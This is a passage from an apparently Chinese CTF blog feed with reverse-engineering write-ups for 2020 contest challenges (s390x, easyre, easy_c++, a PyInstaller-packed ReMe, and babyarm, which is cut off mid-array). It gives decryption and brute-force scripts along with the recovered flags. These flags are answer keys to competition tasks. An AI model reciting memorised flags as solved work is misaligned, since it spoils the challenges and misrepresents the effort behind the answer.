<span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)   <span class="comment">//main函数</span></span><br><span class="line"><span class="number">1000b</span>3e:e3 f0 ff <span class="number">20</span> ff <span class="number">71</span> lay%r15,<span class="number">-224</span>(%r15)</span><br><span class="line"><span class="number">1000b</span>44:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000b</span>48:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">10</span>       ear%r1,%a0</span><br><span class="line"><span class="number">1000b</span>4c:eb <span class="number">11</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">0</span>d sllg%r1,%r1,<span class="number">32</span></span><br><span class="line"><span class="number">1000b</span>52:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">11</span>       ear%r1,%a1</span><br><span class="line"><span class="number">1000b</span>56:d2 <span class="number">07</span> b0 d8 <span class="number">10</span> <span class="number">28</span> mvc<span class="number">216</span>(<span class="number">8</span>,%r11),<span class="number">40</span>(%r1)</span><br><span class="line"><span class="number">1000b</span>5c:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">84</span> larl%r2,<span class="number">0x1071064</span> <span class="comment">//please input ...</span></span><br><span class="line"><span class="number">1000b</span>62:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">43</span> brasl%r14,<span class="number">0x1008be8</span><span class="comment">//printf</span></span><br><span class="line"><span class="number">1000b</span>68:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>6e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">31</span>       lgr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>72:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">87</span> larl%r2,<span class="number">0x1071080</span>      <span class="comment">// %s</span></span><br><span class="line"><span class="number">1000b</span>78:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">3</span>a <span class="number">5</span>c brasl%r14,<span class="number">0x1008030</span> <span class="comment">// scanf(" ");</span></span><br><span class="line"><span class="number">1000b</span>7e:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span> <span class="comment">//add  </span></span><br><span class="line"><span class="number">1000b</span>84:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1%r1 : input</span><br><span class="line"><span class="number">1000b</span>88:c0 e5 ff ff fe c4 brasl%r14,<span class="number">0x1000910</span><span class="comment">//关键加密函数。</span></span><br><span class="line"><span class="number">1000b</span>8e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2<span class="comment">//mov</span></span><br><span class="line"><span class="number">1000b</span>92:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1 <span class="comment">//cmp  test</span></span><br><span class="line"><span class="number">1000b</span>94:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">17</span>       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>98:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>9e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>a2:c0 e5 ff ff ff <span class="number">33</span> brasl%r14,<span class="number">0x1000a08</span></span><br><span class="line"><span class="number">1000b</span>a8:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2</span><br><span class="line"><span class="number">1000b</span>ac:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>ae:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">0</span>a       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>b2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">69</span> larl%r2,<span class="number">0x1071084</span> <span class="comment">// lea "you win"</span></span><br><span class="line"><span class="number">1000b</span>b8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">18</span> brasl%r14,<span class="number">0x1008be8</span></span><br><span class="line"><span class="number">1000b</span>be:a7 f4 <span class="number">00</span> <span class="number">08</span>       j<span class="number">0x1000bce</span></span><br><span class="line"><span class="number">1000b</span>c2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">66</span> larl%r2,<span class="number">0x107108e</span>   <span class="comment">//lea "you lose!"</span></span><br><span class="line"><span class="number">1000b</span>c8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">10</span> brasl%r14,<span class="number">0x1008be8</span></span><br></pre></td></tr></table></figure><p>提取处数据，在gdb中使用x/100xw查看的数据然后提取出（直接找到地址让hex.txt文件找也可以）。</p><p>然后解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[] = &#123; <span class="number">0x0000b2b0</span>, <span class="number">0x00006e72</span>, <span class="number">0x00006061</span>, <span class="number">0x0000565d</span>,</span><br><span class="line"><span class="number">0x0000942d</span>, <span class="number">0x0000ac79</span>, <span class="number">0x0000391c</span>, <span class="number">0x0000643d</span>,</span><br><span class="line"><span class="number">0x0000ec3f</span>, <span class="number">0x0000bd10</span>, <span class="number">0x0000c43e</span>, <span class="number">0x00007a65</span>,</span><br><span class="line"><span class="number">0x0000184b</span>, <span class="number">0x0000ef5b</span>, <span class="number">0x00005a06</span>, <span class="number">0x0000a8c0</span>,</span><br><span class="line"><span class="number">0x0000f64b</span>, <span class="number">0x0000c774</span>, <span class="number">0x000002ff</span>, <span class="number">0x00008e57</span>,</span><br><span class="line"><span class="number">0x0000aed9</span>, <span class="number">0x0000d8a9</span>, <span class="number">0x0000230c</span>, <span class="number">0x000074e8</span>,</span><br><span class="line"><span class="number">0x0000c2a6</span>, <span class="number">0x000088b3</span>, <span class="number">0x0000af2a</span>, <span class="number">0x00009ea7</span>,</span><br><span class="line"><span class="number">0x0000ce8a</span>, <span class="number">0x00005924</span>, <span class="number">0x0000d276</span>, <span class="number">0x000056d4</span>,</span><br><span class="line"><span class="number">0x000077d7</span>, <span class="number">0x0000990e</span>, <span class="number">0x0000b585</span>, <span class="number">0x00004bcd</span>,</span><br><span class="line"><span class="number">0x00005277</span>, <span class="number">0x00001afc</span>, <span class="number">0x00008c8a</span>, <span class="number">0x0000cdb5</span>,</span><br><span class="line"><span class="number">0x00006e26</span>, <span class="number">0x00004c22</span>, <span class="number">0x0000673f</span>, <span class="number">0x0000daff</span>,</span><br><span class="line"><span class="number">0x00000fac</span>, <span class="number">0x000086c7</span>, <span class="number">0x0000e048</span>, <span class="number">0x0000c483</span>,</span><br><span class="line"><span class="number">0x000085d3</span>, <span class="number">0x00002204</span>, <span class="number">0x0000c2ee</span>, <span class="number">0x0000e07f</span>,</span><br><span class="line"><span class="number">0x00000caf</span>, <span class="number">0x0000bf76</span>, <span class="number">0x000063fe</span>, <span class="number">0x0000bffb</span>,</span><br><span class="line"><span class="number">0x00004b09</span>, <span class="number">0x0000e5b3</span>, <span class="number">0x00008bda</span>, <span class="number">0x000096df</span>,</span><br><span class="line"><span class="number">0x0000866d</span>, <span class="number">0x00001719</span>, <span class="number">0x00006bcf</span>, <span class="number">0x0000adcc</span>,</span><br><span class="line"><span class="number">0x00000f2b</span>, <span class="number">0x000051ce</span>, <span class="number">0x00001549</span>, <span class="number">0x000020c1</span>,</span><br><span class="line"><span class="number">0x00003a8d</span>, <span class="number">0x000005f5</span>, <span class="number">0x00005403</span>, <span class="number">0x00001125</span>,</span><br><span class="line"><span class="number">0x00009161</span>, <span class="number">0x0000e2a5</span>, <span class="number">0x00005196</span>, <span class="number">0x0000d8d2</span>,</span><br><span class="line"><span class="number">0x0000d644</span>, <span class="number">0x0000ee86</span>, <span class="number">0x00003896</span>, <span class="number">0x00002e71</span>,</span><br><span class="line"><span class="number">0x0000a6f1</span>, <span class="number">0x0000dfcf</span>, <span class="number">0x00003ece</span>, <span class="number">0x00007d49</span>,</span><br><span class="line"><span class="number">0x0000c24d</span>, <span class="number">0x0000237e</span>, <span class="number">0x00009352</span>, <span class="number">0x00007a97</span>,</span><br><span class="line"><span class="number">0x00007bfa</span>, <span class="number">0x0000cbaa</span>, <span class="number">0x000010dc</span>, <span class="number">0x00003bd9</span>,</span><br><span class="line"><span class="number">0x00007d7b</span>, <span class="number">0x00003b88</span>, <span class="number">0x0000b0d0</span>, <span class="number">0x0000e8bc</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result[] = &#123; <span class="number">0x08a73233</span>, <span class="number">0x116db0f6</span>, <span class="number">0x0e654937</span>, <span class="number">0x03c374a7</span>,</span><br><span class="line"><span class="number">0x16bc8ed9</span>, <span class="number">0x0846b755</span>, <span class="number">0x08949f47</span>, <span class="number">0x04a13c27</span>,</span><br><span class="line"><span class="number">0x0976cf0a</span>, <span class="number">0x07461189</span>, <span class="number">0x1e1a5c12</span>, <span class="number">0x11e64d96</span>,</span><br><span class="line"><span class="number">0x03cf09b3</span>, <span class="number">0x093cb610</span>, <span class="number">0x0d41ea64</span>, <span class="number">0x07648050</span>,</span><br><span class="line"><span class="number">0x092039bf</span>, <span class="number">0x08e7f1f7</span>, <span class="number">0x004d871f</span>, <span class="number">0x1680f823</span>,</span><br><span class="line"><span class="number">0x06f3c3eb</span>, <span class="number">0x2205134d</span>, <span class="number">0x015c6a7c</span>, <span class="number">0x11c67ed0</span>,</span><br><span class="line"><span class="number">0x0817b32e</span>, <span class="number">0x06bd9b92</span>, <span class="number">0x08806b0c</span>, <span class="number">0x06aaa515</span>,</span><br><span class="line"><span class="number">0x205b9f76</span>, <span class="number">0x0de963e9</span>, <span class="number">0x2194e8e2</span>, <span class="number">0x047593bc</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> input = <span class="number">0x20</span>; input &lt; <span class="number">0x7e</span>; input++)</span><br><span class="line">&#123;</span><br><span class="line">a = input*input*data[i]+ data[i + <span class="number">32</span>] * input+ data[i + <span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == result[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8eb5d8b632dae2a5167e3e1c4884eef9</span></span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>直接拖入ida分析完main函数后没有发现加密判断函数，直接动调跟流程，也很简单，整理了下加密与最后比较数据的笔记：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = input[<span class="number">0</span>] &lt;&lt; <span class="number">3</span></span><br><span class="line">b = input[<span class="number">1</span>] &gt;&gt; <span class="number">5</span></span><br><span class="line">a = a|b</span><br><span class="line">a = a ^ i;</span><br><span class="line"></span><br><span class="line">input[i] = (input[i] &lt;&lt; <span class="number">3</span>) | (input[(i+<span class="number">1</span>)%<span class="number">24</span>] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">sar:算术右移指令。右移时保留操作数的符号，即用符号位来补足。</span><br><span class="line">shr:逻辑右移指令。右移时总是用<span class="number">0</span>来补足。</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ch1 = <span class="number">0</span>;</span><br><span class="line">ch1 = (ida_chars[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (ida_chars[<span class="number">23</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">23</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ch1 = (((ida_chars[i]^i) &gt;&gt; <span class="number">3</span>) | ((ida_chars[i<span class="number">-1</span>]^(i<span class="number">-1</span>)) &lt;&lt; <span class="number">5</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line">&#125;</span><br><span class="line">ch1 = (ida_chars[<span class="number">23</span>] &gt;&gt; <span class="number">3</span> ) | ((ida_chars[<span class="number">22</span>]^<span class="number">22</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="comment">//ea5yre_1s_50_ea5y_t0_y0u</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>很简单，ida打开后简单分析以下，只是对输入进行了一个异或，然后与指定编码字符串进行比较。。</p><p>直接在ida-python解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'7d21e&lt;e3&lt;:3;9;ji t r#w\"$*&#123;*+*$|,'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += chr(ord(s[i])^i)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7e02a9c4439056df0e2a7b432b0069b3</span></span><br></pre></td></tr></table></figure><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>首先从程序图标可以想到python，然后ida载入查看字符串，发现很多PY相关的字符且程序不寻常。这时候基本可以确定是python打包成的exe程序了。</p><p>然后使用<strong>python pyinstxtractor.py ReMe.exe</strong>解包，从得到的包里可以pyc文件看到ReMe，但是缺少文件头的，找到包里的另一个stuct文件，对ReMe的文件头进行补齐。</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/909254_VRZ57MQQAC3H4EX.png" alt="https://bbs.pediy.com/upload/attach/202011/909254_VRZ57MQQAC3H4EX.png"></p><p>使用<strong>uncompyle6 -o re.py ReMe.pyc</strong>转化为py文件。</p><p>py代码很简单，把原来的代码稍微修改以下可以直接爆破出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">'e5438e78ec1de10a2693f9cffb930d23'</span>,</span><br><span class="line"> <span class="string">'08e8e8855af8ea652df54845d21b9d67'</span>,</span><br><span class="line"> <span class="string">'a905095f0d801abd5865d649a646b397'</span>,</span><br><span class="line"> <span class="string">'bac8510b0902185146c838cdf8ead8e0'</span>,</span><br><span class="line"> <span class="string">'f26f009a6dc171e0ca7a4a770fecd326'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'4cb467175ab6763a9867b9ed694a2780'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'fd311e9877c3db59027597352999e91f'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'7fb523b42413495cc4e610456d1f1c84'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'bc52c927138231e29e0b05419e741902'</span>,</span><br><span class="line"> <span class="string">'515b7eceeb8f22b53575afec4123e878'</span>,</span><br><span class="line"> <span class="string">'451660d67c64da6de6fadc66079e1d8a'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'fe86104ce1853cb140b7ec0412d93837'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'c2bab7ea31577b955e2c2cac680fb2f4'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'f077b3a47c09b44d7077877a5aff3699'</span>,</span><br><span class="line"> <span class="string">'620741f57e7fafe43216d6aa51666f1d'</span>,</span><br><span class="line"> <span class="string">'9e3b206e50925792c3234036de6a25ab'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'874992ac91866ce1430687aa9f7121fc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(num)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">ret_list = func(ch)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(len(ret_list)):</span><br><span class="line">s += str(ret_list[idx])</span><br><span class="line">s += str(ret_list[(len(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">if</span> md5.hexdigest() == check[i]:</span><br><span class="line">flag += chr(ch)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">   print(<span class="string">'flag&#123;'</span> + md5.hexdigest() + <span class="string">'&#125;'</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#flag&#123;0584cfa2ce502951ef5606f6b99fc921&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;总的来说这次的re都还好。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>X-nuca 2020</title>
    <link href="https://www.bxnop.cn/2020/10/31/X-nuca-2020/"/>
    <id>https://www.bxnop.cn/2020/10/31/X-nuca-2020/</id>
    <published>2020-10-31T10:06:17.000Z</published>
    <updated>2020-12-13T15:13:16.080Z</updated>
    
    <content type="html"><![CDATA[<p>第一次打这个比赛，题目都偏难吧。。做了一个arm架构的题，然后UnravelMFC这个题，比赛时学长师傅做了，就没做了，赛后把它复现了下。</p><p>链接：<a href="https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A" target="_blank" rel="noopener">https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A</a><br>提取码：mflo<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><a id="more"></a><h1 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h1><p>进入程序直接看到假的程序流程。。看了下函数，然后gdb开一个端口不断调试跟找到关键函数。其实从<strong>ELF Initialization Function Table</strong> 也可以看见关键加密函数：<strong>sub_114D8</strong>。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201105163344611.png" alt="image-20201105163344611"></p><p>确定关键函数后不断调试。。从调试看到，首先对输入字符hex，然后再byes.fromhex()，所以最后就是我们输入的字符。</p><p>剩下就是慢慢整理数据，解密。。循环加密数据。。</p><p>加密中2中取已经编码数据的表达式需要注意一下，动调可以很明白。</p><p><strong>(_DWORD *)(&amp;v40 + (v17 &amp; 0xC) - 20)</strong></p><p><strong>(*((_DWORD *)&amp;v40 + (((unsigned __int8)(v17 &gt;&gt; 2) ^ 1) &amp; 3) - 5)</strong></p><p>首先取出最后比较的密文变成16个4字节数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xF0</span>, <span class="number">0x61</span>, <span class="number">0xB0</span>, <span class="number">0x7E</span>, <span class="number">0x56</span>, <span class="number">0xC8</span>, <span class="number">0xB3</span>, <span class="number">0xC7</span>, <span class="number">0xA3</span>, </span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x22</span>, <span class="number">0xE3</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0xE5</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xDC</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x0F</span>, <span class="number">0x83</span>, <span class="number">0xD0</span>, <span class="number">0xF4</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x81</span>, <span class="number">0x57</span>, <span class="number">0x8A</span>, <span class="number">0x4F</span>, <span class="number">0xEC</span>, <span class="number">0x04</span>, <span class="number">0x86</span>, <span class="number">0x7F</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x2E</span>, <span class="number">0xF3</span>, <span class="number">0xDD</span>, <span class="number">0x17</span>, <span 